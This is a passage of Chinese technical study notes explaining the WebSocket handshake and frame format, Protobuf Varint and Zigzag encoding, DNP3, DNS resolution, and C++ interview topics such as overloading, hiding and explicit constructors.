加密，传输给服务器，服务器通过私钥解密获取到对称加密密钥。\n第三组(对称加密)：客户端和服务器后续传输的数据都通过这个对称密钥加密解密。\nref：https://blog.csdn.net/qq15035899256/article/details/126430171\nWebsocketWebSocket 是一种网络通信协议。RFC6455 定义了它的通信标准。\n  http是一种无状态，无连接，单向的应用层协议，它采用了请求&#x2F;响应模型，通信请求只能由客户端发起，服务端对请求做出应答处理。这样的弊端显然是很大的，只要服务端状态连续变化，客户端就必须实时响应，都是通过javascript与ajax进行轮询，这样显然是非常麻烦的，同时轮询的效率低，非常的浪费资源(http一直打开，一直重复的连接)。\n于是就有了websocket，它是一种全面双工通讯的网络技术，任意一方都可以建立连接将数据推向另一方，websocket只需要建立一次连接，就可以一直保持\nWebSocket工作原理\n握手(建立连接)，web浏览器和服务器都必须使用websocket来建立维护连接，也可以理解为HTTP握手 (handshake)和TCP数据传输\n浏览器向http一样发起一个请求，等待服务器响应服务器返回握手响应，告诉浏览器将后续的数据按照websocket的制定格式传输过来\n服务器接收到了之后，服务器与浏览器之间连接不中断，此时连接已经是双工的了\n浏览器和服务器由任何需要传输的数据时使用长连接来进行数据传递；\n\nwebsocket握手过程1、浏览器、服务器建立TCP连接，三次握手。这是通信的基础，传输控制层，若失败后续都不执行。2、TCP连接成功后，浏览器通过HTTP协议向服务器传送WebSocket支持的版本号等信息。（开始前的HTTP握手）3、服务器收到客户端的握手请求后，同样采用HTTP协议回馈数据。4、当收到了连接成功的消息后，通过TCP通道进行传输通信。\nwebsocket协议头请求\nAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Connection: UpgradeHost: 192.168.1.2:8080Sec-WebSocket-Key: 821VqJT7EjnceB8m7mbwWA==Sec-WebSocket-Version: 13Upgrade: websocketUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39\n\n\nUpgrade: 向服务器指定协议类型，告诉web服务器当前使用的是websocket协议\nSec-WebSocket-Key：是一个 Base64 encode 的值，这个是浏览器随机生成的\nSec-WebSocket-Version：websocket协议版本\n\n响应\nConnection: UpgradeDate: Sat, 16 Apr 2022 10:49:05 GMTSec-WebSocket-Accept: paFykwJusIMnfpohWxA5HVpjD1Q=Server: ServerUpgrade: websocket\n\n\n响应头详解(web服务返回状态码101表示协议切换成功)\nSec-WebSocket-Accept: 是经过服务器确认，并且加密过后的 Sec-WebSocket-Key。用来证明客户端和服务器之间能进行通信了。\n\n数据帧格式在 WebSocket 协议中，客户端与服务端数据交换的最小信息单位叫做帧（frame），由 1 个或多个帧按照次序组成一条完整的消息（message）。\n数据传输的格式是由ABNF 来描述的。\nWebSocket 数据帧的统一格式如下图：\n0                   1                   2                   30 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1+-+-+-+-+-------+-+-------------+-------------------------------+|F|R|R|R| opcode|M| Payload len |    Extended payload length    ||I|S|S|S|  (4)  |A|     (7)     |             (16/64)           ||N|V|V|V|       |S|             |   (if payload len==126/127)   || |1|2|3|       |K|             |                               |+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +|     Extended payload length continued, if payload len == 127  |+ - - - - - - - - - - - - - - - +-------------------------------+|                               |Masking-key, if MASK set to 1  |+-------------------------------+-------------------------------+| Masking-key (continued)       |          Payload Data         |+-------------------------------- - - - - - - - - - - - - - - - +:                     Payload Data continued ...                :+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +|                     Payload Data continued ...                |+---------------------------------------------------------------+\n\n上面图中名词解释：\n\n\n\n名词\n说明\n大小\n\n\n\nFIN\n如果是 1，表示这是消息（message）的最后一个分片（fragment）；如果是 0，表示不是是消息（message）的最后一个分片（fragment）\n1 个比特\n\n\nRSV1, RSV2, RSV3\n一般情况下全为 0。当客户端、服务端协商采用 WebSocket 扩展时，这三个标志位可以非 0，且值的含义由扩展进行定义。如果出现非零的值，且并没有采用 WebSocket 扩展，连接出错\n各占 1 个比特\n\n\nopcode\n操作代码，Opcode 的值决定了应该如何解析后续的数据载荷（data payload）。如果操作代码是不认识的，那么接收端应该断开连接（fail the connection）\n4 个比特\n\n\nmask\n表示是否要对数据载荷进行掩码操作。从客户端向服务端发送数据时，需要对数据进行掩码操作；从服务端向客户端发送数据时，不需要对数据进行掩码操作。 如果服务端接收到的数据没有进行过掩码操作，服务端需要断开连接。 如果 Mask 是 1，那么在 Masking-key 中会定义一个掩码键（masking key），并用这个掩码键来对数据载荷进行反掩码。所有客户端发送到服务端的数据帧，Mask 都是 1。\n1 个比特\n\n\nPayload length\n数据载荷的长度，单位是字节。假设数 Payload length &#x3D;&#x3D;&#x3D; x，如果： x 为 0~126：数据的长度为 x 字节。 x 为 126：后续 2 个字节代表一个 16 位的无符号整数，该无符号整数的值为数据的长度。 x 为 127：后续 8 个字节代表一个 64 位的无符号整数（最高位为 0），该无符号整数的值为数据的长度。 此外，如果 payload length 占用了多个字节的话，payload length 的二进制表达采用网络序（big endian，重要的位在前）。\n为 7 位，或 7+16 位，或 1+64 位。\n\n\nMasking-key\n所有从客户端传送到服务端的数据帧，数据载荷都进行了掩码操作，Mask 为 1，且携带了 4 字节的 Masking-key。如果 Mask 为 0，则没有 Masking-key。 备注：载荷数据的长度，不包括 mask key 的长度。\n0 或 4 字节（32 位\n\n\nPayload data\n载荷数据：包括了扩展数据、应用数据。其中，扩展数据 x 字节，应用数据 y 字节。The “Payload data” is defined as “Extension data” concatenated with “Application data”. 扩展数据：如果没有协商使用扩展的话，扩展数据数据为 0 字节。所有的扩展都必须声明扩展数据的长度，或者可以如何计算出扩展数据的长度。此外，扩展如何使用必须在握手阶段就协商好。如果扩展数据存在，那么载荷数据长度必须将扩展数据的长度包含在内。 应用数据：任意的应用数据，在扩展数据之后（如果存在扩展数据），占据了数据帧剩余的位置。载荷数据长度 减去 扩展数据长度，就得到应用数据的长度。\n(x+y) 字节\n\n\n表中 opcode 操作码：\n\n\n%x0：表示一个延续帧（continuation frame）。当 Opcode 为 0 时，表示本次数据传输采用了数据分片，当前收到的数据帧为其中一个数据分片。\n%x1：表示这是一个文本帧（frame），text frame\n%x2：表示这是一个二进制帧（frame），binary frame\n%x3-7：保留的操作代码，用于后续定义的非控制帧。\n%x8：表示连接断开。connection close\n%x9：表示这是一个 ping 操作。a ping\n%xA：表示这是一个 pong 操作。a pong\n%xB-F：保留的操作代码，用于后续定义的控制帧。\n\n\nref：https://blog.csdn.net/new9232/article/details/124208409\nref：https://blog.csdn.net/Huang_Ds/article/details/125671913\nref: https://www.shuzhiduo.com/A/x9J2A1WKz6/\nProtobufProtobuf 是由 Google 开发的一种语言无关，平台无关，可扩展的序列化结构数据的方法，可用于通信和数据存储。\n1）跨语言，跨平台\nProtobuf 和语言，平台无关，定义好 pb 文件之后，对于不同的语言使用不同的语言的编译器对 pb 文件进行编译即可，编译完成之后就会提供对应语言能够使用的接口，通过这些接口就可以访问在 pb 文件中定义好的内容了。\n2）性能优越\nProtobuf 十分高效，无论是在数据存储还是通信性能都非常好，序列化的体积很小，序列化的速度也很快，关于这一点会在后面第 3 节序列化原理章节中做详细的介绍。\n3）兼容性好\nProtobuf 的兼容性特别好，当我们更新数据的时候不会影响原有的程序，例如 int32 和 int64 是两种不同的类型，存储的数据占用的字节数也不同，但是如果现在需要存储一个负数，采用 Varints 编码时，它们都会占用固定的十个字节，这是为了防止用户在将 int64 改为 int32 时会影响原有的程序。关于这方面的内容，在第3节也会做详细的介绍。\nProtobuf, JSON, XML 的区别Protobuf 和 JSON，XML 既有相似点又有不同点，从数据结构化和数据序列化两个维度去进行比较可能会更直观一些。\n数据结构化主要面向开发和业务层面，数据序列化主要面向通信和存储层面。当然数据序列化也需要结构和格式，所以这两者的区别主要在于应用领域和场景不同，因此要求和侧重点也会有所不同。\n数据结构化更加侧重于人类的可读性，强调语义表达能力，而数据序列化侧重效率和压缩。\n接下来从这两个维度出发，我们进行一些简单的分析。\nXML 作为一种可扩展标记语言，JSON 作为源于 JS 的数据格式，都具有数据结构化的能力。\n例如 XML 可以衍生出 HTML(虽然 HTNL 早于 XML，但从概念上讲，HTML 只是预定义标签的 XML)，HTML 的作用是标记和表达万维网中资源的结构，以便浏览器更好地展示万维网资源，同时也要尽可能保证其人类可读以便开发人员进行开发，这是面向业务或开发层面的数据结构化。\n再如 XML 还可衍生出 RDF&#x2F;RDFS，进一步表达语义网中资源的关系和语义，同样它强调数据结构化的能力和人类可读。\nJSON 也是同理，在很多场景下更多的是体现了数据结构化的能力，例如作为交互接口的数据结构的表达。\n当然，JSON 和 XML 同样也可以直接被用来数据序列化，实际上很多时候它们也是被这么使用的，例如直接采用 JSON，XML 进行网络通信传输，此时 XML 和 JSON 就成了一种序列化格式，发挥了数据序列化的能力。\n但是我们平时开发的时候经常会这么用并不代表就是合理的，或者说是最好的。实际上，将 JSON 和 XML 直接数据序列化进行网络传输通常并不是最优的选择。因为它们在速度、效率，占用空间上都并不是最优的。换句话说它们更适合数据结构化而不是数据序列化。但是如果从这两方面综合考虑或许我们平时的选择又是合理的。\nProtobuf 在数据结构化方面可能没有那么突出，但是在数据序列化方面，你会发现 Protobuf 具有明显的优势，效率，速度，空间几乎全面占优，这一部分将会在第 3 节编解码部分做出详细的阐述。\n稍微做一个小的总结：\n1）XML、JSON、Protobuf 都具有数据结构化和序列化的能力；\n2）XML、JSON 更注重数据结构化，关注人类可读性和语义表达能力，Protobuf 更注重数据序列化，关注效率，空间，速度。\n3）Protobuf 的应用场景更为明确，一般是在传输数据量较大，RPC 服务数据数据传输，XML、JSON 的应用场景更为丰富，传输数据量较小，在 MongoDB 中采用 JSON 作为查询语句，也是在发挥其数据结构化的能力。\nProtobuf 序列化原理Protobuf 编码结构protobuf 数据存储采用 Tag-Length-Value 即标识 - 长度 - 字段值存储方式，以标识 - 长度 - 字段值表示单个字段，最终将数据拼接成一个字节流，从而实现数据存储的功能。\n\n\n可以看到当采用 T - L - V 的存储结构时不需要分隔符就能分隔开字段，各字段存储地非常紧凑，存储空间利用率非常高。\n此外如果某字段没有被设置字段值，那么该字段在序列化时是完全不存在的，即不需要编码，这个字段在解码时才会被设置默认值。\n接下来重点介绍一下每个字段中都存在的 Tag。\nTag 由 field_number 和 wire_type 两部分组成，其中 field_number 是字段的标识号，wire_type 是一个数值，根据它的数值可以确定该字段的字段值需要采用的编码类型。\n// Tag 的具体表达式如下 Tag  = (field_number &lt;&lt; 3) | wire_type;// 参数说明：// field_number：对应于 .proto文件中消息字段的标识号，表示这是消息里的第几个字段// 原来的field_number需要左移三位再拼接上wire_type就会得出Tag，所以真正的field_number是将Tag右移三位后的值// field_number &lt;&lt; 3：表示 field_number = 将 Tag的二进制表示右移三位后的值 // field_num左移3位不会导致数据丢失，因为表示范围还是足够大地去表示消息里的字段数目//  wire_type：表示 字段 的数据类型//  wire_type = Tag的二进制表示 的最低三位值//  wire_type 的取值enum WireType &#123;   WIRETYPE_Varint = 0,   WIRETYPE_FIXED64 = 1,   WIRETYPE_LENGTH_DELIMITED = 2,   WIRETYPE_START_GROUP = 3,   WIRETYPE_END_GROUP = 4,   WIRETYPE_FIXED32 = 5&#125;;// 从上面可以看出，`wire_type` 最多占用 3 位的内存空间（因为3位足以表示 0-5 的二进制）\n\nwire_type 占 3 bit，最多可以表达 8 种编码类型，目前 Protobuf 已经定义了 6 种(Start group 和 End group 已经被废弃掉了)，如下图所示。\n\n\n每个字段根据不同的编码类型会有下面两种编码格式：\n\nTag - Length - Value: 编码类型表中 Type &#x3D; 2，即 Length - delimited 编码类型将使用这种结构\nTag - Value: 编码类型表中 Varint，64-bit，32-bit 将使用这种结构\n\n接下来就来详细地介绍一下各种编码类型。\nVarint 编码Varint 编码是一种变长的编码方式，用字节表示数字，值越小的数字，使用越少的字节数表示。它通过减少表示数字的字节数从而进行数据压缩。\nVarint 编码规则部分源码：\nprivate void writeVarint32(int n) &#123;                                                                                      int idx = 0;    while (true) &#123;      if ((n &amp; ~0x7F) == 0) &#123;        i32buf[idx++] = (byte)n;        break;      &#125; else &#123;        i32buf[idx++] = (byte)((n &amp; 0x7F) | 0x80);        // 步骤1：取出字节串末7位      // 对于上述取出的7位：在最高位添加1构成一个字节      // 如果是最后一次取出，则在最高位添加0构成1个字节      n &gt;&gt;&gt;= 7;        // 步骤2：通过将字节串整体往右移7位，继续从字节串的末尾选取7位，直到取完为止。    &#125;    &#125;    trans_.write(i32buf, 0, idx);       // 步骤3： 将上述形成的每个字节 按序拼接 成一个字节串      // 即该字节串就是经过Varint编码后的字节&#125;   \n\n从步骤 1 中可以看出，Varint 编码中每个字节的最高位都有特殊的含义：\n\n如果是 1，表示后续的字节也是该数字的一部分，需要继续读取\n如果是 0，表示这是最后一个字节，且剩余 7 位都用来表示数字\n\n所以，当使用 Varint 编码时，只要读取到最高位为 0 的字节时，就表示已经是 Varint 的最后一个字节了。\n可以简单地将 Varint 的编码规则归结为以下三点：\n1）在每个字节开头的 bit 设置了 msb(most significant bit)，标识是否需要继续读取下一个字节\n2）存储数字对应的二进制补码\n3）补码的低位排在前面\n\n补码的计算方法:\n对于正数，原码和补码相同\n对于负数，最高位符号位不变，其它位按位取反然后加 1\n\nVarint 编码示例接下来通过一个示例来说明一下 Varint 编码的过程\n示例 1\nint32 a = 8;\n\n\n原码：0000 … 0000 1000\n补码：0000 … 0000 1000\n根据 Varint 编码规则，从低位开始取 7 bit，000 1000\n当取出前 7 bit 后，前面所有的位就都是 0 了，不需要继续读取了，因此设置 msb 位为 0 即可\n所以最终 Varint 编码为 0000 1000\n\n可以看到在使用 Varint 编码后只使用一个字节就可以了，而正常的 int32 编码一般需要 4 个字节。\n仔细体会上述的 Varint 编码，我们可以发现 Varint 编码本质实际上是每个字节都牺牲了一个 bit 位，来表示是否已经结束(是否需要继续读取下一个字节)，msb 实际上就起到了 length 的作用，正因为有了这个 msb 位，所以我们可以摆脱原来那种无论数字大小都必须分配四个字节的窘境。\n通过 Varint 编码对于比较小的数字可以用很少的字节进行表示，从而减小了序列化后的体积。\n但是由于 Varint 编码每个字节都要拿出一位作为 msb 位，因此每个字节就少了一位来表示字段值。那这就意味着四个字节能表达的最大数字是为 2^28 而不是 2^32 了。\n所以如果当数字大于 2^28 时，采用 Varint 编码将导致分配 5 个字节，原先明明只需要 4 个字节。此时 Varint 编码的效率不仅没有提高反而是下降了。\n但是这并不影响 Varint 编码在实际应用时的高效，因为事实证明，在大多数情况下，数字在 2^28 ~ 2^32 出现的概率要远远小于 0 ~ 2^28 出现的概率。\n示例 2\n这样看来 Varint 编码似乎很完美，但是有一种情况下，Varint 编码的效率很低。上面的例子中只给出了正数的情况，思考如果是负数的情况呢。\n我们知道负数的二进制表示中最高位是符号位 1，这一点意味着负数都必须占用所有字节。\n我们还是通过一个示例来体会一下。\nint32 a = -1\n\n\n原码：1000 … 0000 0001\n补码：1111 … 1111 1111\n根据 Varints 编码规则，从低位开始取 7 bit，111 1111，由于前面还有 1 需要读取，因此需要设置 msb 位为 1，然后将这个字节放在 Varint 编码的高位。\n依次类推，有 9 组(字节)都是 1，这 9 组的 msb 均为 1，最后一组只有 1 位是 1，由于已经是最后一组了不需要再继续读取了，因此这组的 msb 位应该是 0.\n因此最终的 Varint 编码是 1111 1111 … 0000 0001（FF FF FF FF FF FF FF FF FF 01 ）\n\n可能大家会有疑问为什么会占用 10 个字节呢？\n这是 Protobuf 基于兼容性考虑，例如当开发者将 int64 改为 int32 后应该不影响旧程序，所以将 int32 扩展为 int64 的八个字节。\n可能大家还会有疑问为什么对于正数的时候不需要进行类似的兼容处理呢？\n实际上当要编码的是正数时，int32 和 int64 是天然兼容的，他们两个的编码过程是完全一样的，利用 msb 位去控制最终的 Varint 编码长度即可。\n所以目前的情况是我们定义了一个 int32 类型的变量，如果将变量的值设置为 负数，如果直接采用 Varint 编码的话，其编码结果将总是占用十个字节，这显然不是我们希望得到的结果。那么我们应该如何去解决呢？\n答案就是下面的 Zigzag 编码。\nZigzag 编码在 Protobuf 中 Zigzag 编码的出现主要是为了解决 Varint 编码负数效率低的问题。\n基本原理就是将有符号正数映射成无符号整数，然后再使用 Varint 编码，这里所说的映射是通过移位的方式实现的并不是通过存储映射表。\nZigzag 编码规则部分源码：\npublic int int_to_Zigzag(int n) &#123;// 传入的参数n = 传入字段值的二进制表示（此处以负数为例）// 负数的二进制 = 符号位为1，剩余的位数为该数绝对值的原码按位取反；然后整个二进制数+1  return (n &lt;&lt;1) ^ (n &gt;&gt;31);&#125;// 解码public int Zigzag_to_int(int n) &#123;  return (n &gt;&gt;&gt; 1) ^ -(n &amp; 1);&#125;\n\n根据上面的源码我们可以得出 Zigzag 的编码过程如下：\n\n将补码左移 1 位，低位补 0，得到 result1\n将补码右移 31 位，得到 result2\n首位是 1 的补码(有符号数)是算数右移，即右移后左边补 1\n首位是 0 的补码(无符号数)是逻辑右移，即右移后左边补 0\n\n\n将 result1 和 result2 异或\n\nZigzag 编码示例下面通过一个示例来演示一个 Zigzag 的编码过程\nsint32 a = -2\n\n\n原码：1000 … 0010\n补码：1111 … 1110\n左移一位(算数右移)result1：1111 … 1100\n右移31位result2：1111 … 1111\n异或: 0000 … 0011(3)\n\n编码过程示意图如下：\n\n\n可以看到 -2 经过 Zigzag 编码之后变成了正数 3，这时再通过 Varint 编码就很高效了，在接收端先通过 Varint 解码得到数字 3，然后再通过 Zigzag 解码就可以得到原始发送的数据 -2 了。\n因此在定义字段时如果知道该字段的值有可能是负数的话，那么建议使用 sint32&#x2F;sint64 这两种数据类型。\n64-bit(32-bit)编码64-bit 和 32-bit 的编码方式比较简单，64-bit 编码后是固定的 8 个字节，32 bit 编码后是固定的 4 个字节。当数据类型是 fixed64，sfixed64，double 时将采用 64-bit 编码方式，当数据类型是 fixd32，sfixed64，float 时将采用 32-bit 编码方式。\n\n注意这两种编码方式都是补码的高位放到编码后的低位。\n\n它们都采用的是 T - V 的存储方式。\n\n\nength-delimited这是 Protobuf 中唯一一个采用 T - L - V 的存储方式。如下图所示，Tag 和 Length 仍然采用 Varint 编码，对于字段值根据不同的数据类型采用不同的编码方式。\n例如，对于 string 类型字段值采用的是 utf-8 编码，而对于嵌套消息数据类型会根据里面字段的类型选择不同的编码方式。\n\n\n接下来重点说一下嵌套消息数据类型是如何进行编码的。\n通过下面的示例来说明，在 Test3 这个 Message 对象中的 c 字段的类型是一个消息对象 Test2，并且将 Test2 中字段 str 的值设置为 testing，将字段 id1 的值设置为 296.\nmessage Test2 &#123;  required string str = 1;  required int32 id1   = 2;&#125;message Test3 &#123;  required Test2 c = 1&#125;// 将Test2中的字段str设置为：testing// 将Test2中的字段id1设置为：296// 编码后的字节为：10 ，12 ，18，7，116, 101, 115, 116, 105, 110, 103，16，-88，2\n\n那么编码后的存储方式如下：\n\n\n序列化过程Protobuf 的性能非常优越主要体现在两点，其中一点就是序列化后的体积非常小，这一点在前面编解码的介绍中已经体现出来了。还有另外一点就是序列化速度非常快，接下来就简单地介绍一下为什么序列化的速度非常快。\nProtobuf 序列化的过程简单来说主要有下面两步\n\n判断每个字段是否有设置值，有值才进行编码，\n根据 tag 中的 wire_type 确定该字段采用什么类型的编码方案进行编码即可。\n\nProtobuf 反序列化过程简单来说也主要有下面两步：\n\n调用消息类的 parseFrom(input) 解析从输入流读入的二进制字节数据流\n将解析出来的数据按照指定的格式读取到相应语言的结构类型中\n\nProtobuf 的序列化过程中由于编码方式简单，只需要简单的数学运算位移即可，而且采用的是 Protobuf 框架代码和编译器共同完成，因此序列化的速度非常快。\n可能这样并不能很直观地展现出 Protobuf 序列化过程非常快，接下来我们简单介绍一下 XML 的反序列化过程，通过对比我们就能清晰地认识到 Protobuf 序列化的速度是非常快的。\nXML 反序列化的过程大致如下：\n\n从文件中读取出字符串\n从字符串转换为 XML 文档对象模型\n从 XML 文档对象结构模型中读取指定节点的字符串\n将该字符串转换成指定类型的变量\n\n从上述过程中，我们可以看到 XML 反序列化的过程比较繁琐，而且在第二步，将 XML 文件转换为文档对象模型的过程是需要词法分析的，这个过程是比较耗费时间的，因此通过对比我们就可以感受到 Protobuf 的序列化的速度是非常快的。\n使用建议接下来结合上面所提到的一些知识，简单给出一些在使用 Protobuf 时的一些小建议。\n1）如果有负数，那么尽量使用 sint32/sint64 ，不要使用 int32/int64，因为采用 sin32/sin64 数据类型表示负数时，根据前面的介绍可以知道会先采用 Zigzag 将负数通过移位的方式映射为正数， 然后再使用 Varint 编码，这样就可以有效减少存储的字节数。\n2）字段标识号的时候尽量只使用 1~15，并且不要跳动使用。因为如果超过 15，那么 Tag 在编码时就会占用更多的字节。如果将字段标识号定义为连续递增的数值，将会获得更好的编码性能和解码性能。\n3）尽量多地使用 optional 或 repeated 修饰符(在 proto3 版本中默认是 optional)，因为使用这两个修饰符后如果不设置值，在序列化时是不进行编码的，默认值会在反序列化时自动添加。\nref: http://t.zoukankan.com/zhangguicheng-p-14117962.html\nDNP3ZPMC OPC Server支持与电力系统中子站系统，RTU，智能电子设备以及主站系统等通过以太网RS232&#x2F;485串行通讯，将使用您的计算机中的网卡或串口。本驱动支持的通讯协议为 Distributed Network Protocol 3.0（简称DNP3）协议。\nDnp3协议 一共分为三层 链路层、传输层、应用层\nref: https://www.bbsmax.com/A/mo5kEvo2zw/\nDNS收起\n域名的层级结构\n查询过程\n递归查询和迭代查询\nDNS 缓存\nDNS 实现负载平衡\nDNS 协议提供的是一种主机名到 IP 地址的转换服务，就是我们常说的域名系统。它是一个由分层的 DNS 服务器组成的分 布式数据库，是定义了主机如何 查询这个分布式数据库的方式的应用层协议。DNS 协议运行在 UDP 协议之上， 使用 53 号 端口\n域名的层级结构主机名.次级域名.顶级域名.根域名\n即 host.sld.tld.roo\n根据域名的层级结构，管理不同层级域名的服务器，可以分为根域名服务器、顶级域名服务器和权威域名服务器。\n查询过程DNS 的查询过程一般为，我们首先将 DNS 请求发送到本地 DNS 服务器，由 本地 DNS 服务器来代为请求。\n\\1. 从”根域名服务器”查到”顶级域名服务器”的 NS 记录和 A 记录（ IP 地 址）。\n\\2. 从”顶级域名服务器”查到”次级域名服务器”的 NS 记录和 A 记录（ IP 地址）。\n\\3. 从”次级域名服务器”查出”主机名”的 IP 地址。\n比如我们如果想要查询 http://www.baidu.com 的 IP 地址，我们首先会将请求发送到 本地的 DNS 服务器中，本地 DNS 服务 器会判断是否存在该域名的缓存，如 果不存在，则向根域名服务器发送一个请求，根域名服务器返回负责 .com 的 顶级域名 服务器的 IP 地址的列表。然后本地 DNS 服务器再向其中一个负 责 .com 的顶级域名服务器发送一个请求，负责 .com 的顶级域名服务器返回 负责 .baidu 的权威域名服务器的 IP 地址列表。然后本地 DNS 服务器再向其 中一个权威域名服 务器发送一个请求，最后权威域名服务器返回一个对应的主 机名的 IP 地址列\n递归查询和迭代查询递归查询指的是查询请求发出后，域名服务器代为向下一级域名服务器发出请求， 最后向用户返回查询的最终结果。使用递归 查询，用户只需要发出一次查询请 求。\n迭代查询指的是查询请求后，域名服务器返回单次查询的结果。下一级的查询由 用户自己请求。使用迭代查询，用户需要发出 多次的查询请求。 一般我们向本地 DNS 服务器发送请求的方式就是递归查询，因为我们只需要发 出一次请求，然后本地 DNS 服务器返回给我 们最终的请求结果。\n而本地 DNS 服务器向其他域名服务器请求的过程是迭代查询的过程，因为每一次域名服务器 只返回单次 查询的结果，下一级的查询由本地 DNS 服务器自己进行。\nDNS 缓存DNS 缓存的原理非常简单，在一个请求链中，当某个 DNS 服务器接收到一个 DNS 回答后，它能够将回答中的信息缓存在本 地存储器中。返回的资源记录中 的 TTL 代表了该条记录的缓存的时间\nDNS 实现负载平衡DNS 可以用于在冗余的服务器上实现负载平衡。因为现在一般的大型网站使用 多台服务器提供服务，因此一个域名可能会对应 多个服务器地址。当用户发起 网站域名的 DNS 请求的时候，DNS 服务器返回这个域名所对应的服务器 IP 地址的集合，但在每个回答中，会循环这些 IP 地址的顺序，用户一般会选择排在前面的地址发送请求。以此将用户的请求均衡的分配到各个不同的服务器 上，这样来实现负载均衡。\nref: https://zhuanlan.zhihu.com/p/461210825\nSock5编程语言C++什么是面向对象面向对象：对象是指具体的某一个事物，这些事物的抽象就是类，类中包含数据（成员变量）和动作（成员方法）。\n面向对象的三大特性：\n封装：将具体的实现过程和数据封装成一个函数，只能通过接口进行访问，降低耦合性。\n继承：子类继承父类的特征和行为，子类有父类的非 private 方法或成员变量，子类可以对父类的方法进行重写，增强了类之间的耦合性，但是当父类中的成员变量、成员函数或者类本身被 final 关键字修饰时，修饰的类不能继承，修饰的成员不能重写或修改。（这里说明一下，其实父类中的private方法也会被继承下来，只不过是不能被访问。）\n多态：多态就是不同继承类的对象，对同一消息做出不同的响应，基类的指针指向或绑定到派生类的对象，使得基类指针呈现不同的表现方式。\n重载、重写、隐藏的区别\n重载：是指同一可访问区内被声明几个具有不同参数列（参数的类型、个数、顺序）的同名函数，根据参数列表确定调用哪个函数，重载不关心函数返回类型。\n\nclass A&#123;public:    void fun(int tmp);    void fun(float tmp);        // 重载 参数类型不同（相对于上一个函数）    void fun(int tmp, float tmp1); // 重载 参数个数不同（相对于上一个函数）    void fun(float tmp, int tmp1); // 重载 参数顺序不同（相对于上一个函数）    int fun(int tmp);            // error: &#x27;int A::fun(int)&#x27; cannot be overloaded 错误：注意重载不关心函数返回类型&#125;;\n\n\n隐藏：是指派生类的函数屏蔽了与其同名的基类函数，主要只要同名函数，不管参数列表是否相同，基类函数都会被隐藏。\n\n#include &lt;iostream&gt;using namespace std;class Base&#123;public:    void fun(int tmp, float tmp1) &#123; cout &lt;&lt; &quot;Base::fun(int tmp, float tmp1)&quot; &lt;&lt; endl; &#125;&#125;;class Derive : public Base&#123;public:    void fun(int tmp) &#123; cout &lt;&lt; &quot;Derive::fun(int tmp)&quot; &lt;&lt; endl; &#125; // 隐藏基类中的同名函数&#125;;int main()&#123;    Derive ex;    ex.fun(1);       // Derive::fun(int tmp)    ex.fun(1, 0.01); // error: candidate expects 1 argument, 2 provided    return 0;&#125;\n\n\n重写(覆盖)：是指派生类中存在重新定义的函数。函数名、参数列表、返回值类型都必须同基类中被重写的函数一致，只有函数体不同。派生类调用时会调用派生类的重写函数，不会调用被重写函数。重写的基类中被重写的函数必须有 virtual 修饰。\n\n重写和重载的区别：范围区别：对于类中函数的重载或者重写而言，重载发生在同一个类的内部，重写发生在不同的类之间（子类和父类之间）。\n参数区别：重载的函数需要与原函数有相同的函数名、不同的参数列表，不关注函数的返回值类型；重写的函数的函数名、参数列表和返回值类型都需要和原函数相同，父类中被重写的函数需要有 virtual 修饰。\nvirtual 关键字：重写的函数基类中必须有 virtual关键字的修饰，重载的函数可以有 virtual 关键字的修饰也可以没有。\n隐藏和重写，重载的区别：范围区别：隐藏与重载范围不同，隐藏发生在不同类中。\n参数区别：隐藏函数和被隐藏函数参数列表可以相同，也可以不同，但函数名一定相同；当参数不同时，无论基类中的函数是否被 virtual 修饰，基类函数都是被隐藏，而不是重写。\nexplicit 的作用（如何避免编译器进行隐式类型转换）作用：用来声明类构造函数是显示调用的，而非隐式调用，可以阻止调用构造函数时进行隐式转换。只可用于修饰单参构造函数，因为无参构造函数和多参构造函数本身就是显示调用的，再加上 explicit 关键字也没有什么意义。\n隐式转换：\n#include &lt;iostream&gt;#include &lt;cstring&gt;using namespace std;class A&#123;public:    int var;    A(int tmp)    &#123;        var = tmp;    &#125;&#125;;int main()&#123;    A ex = 10; // 发生了隐式转换    return 0;&#125;\n\n上述代码中，A ex &#x3D; 10; 在编译时，进行了隐式转换，将 10 转换成 A 类型的对象，然后将该对象赋值给 ex，等同于如下操作：\n为了避免隐式转换，可用 explicit 关键字进行声明：\n#include &lt;iostream&gt;#include &lt;cstring&gt;using namespace std;class A&#123;public:    int var;    explicit A(int tmp)    &#123;        var = tmp;        cout &lt;&lt; var &lt;&lt; endl;    &#125;&#125;;int main()&#123;    A ex(100);    A ex1 = 10; // error: conversion from &#x27;int&#x27; to non-scalar type &#x27;A&#x27; requested    return 0;&#125;\n\n\n\nnew 和 malloc 的区别，delete 和 free 的区别在使用的时候 new、delete 搭配使用，malloc、free 搭配使用。\nmalloc、free 是库函数，而new、delete 是关键字。-new 申请空间时，无需指定分配空间的大小，编译器会根据类型自行计算；malloc 在申请空间时，需要确定所申请空间的大小。new 申请空间时，返回的类型是对象的指针类型，无需强制类型转换，是类型安全的操作符；malloc 申请空间时，返回的是 void* 类型，需要进行强制类型的转换，转换为对象类型的指针。new 分配失败时，会抛出 bad_alloc 异常，malloc 分配失败时返回空指针。对于自定义的类型，new 首先调用 operator new() 函数申请空间（底层通过 malloc 实现），然后调用构造函数进行初始化，最后返回自定义类型的指针；delete 首先调用析构函数，然后调用 operator delete() 释放空间（底层通过 free 实现）。malloc、free 无法进行自定义类型的对象的构造和析构。new 操作符从自由存储区上为对象动态分配内存，而 malloc 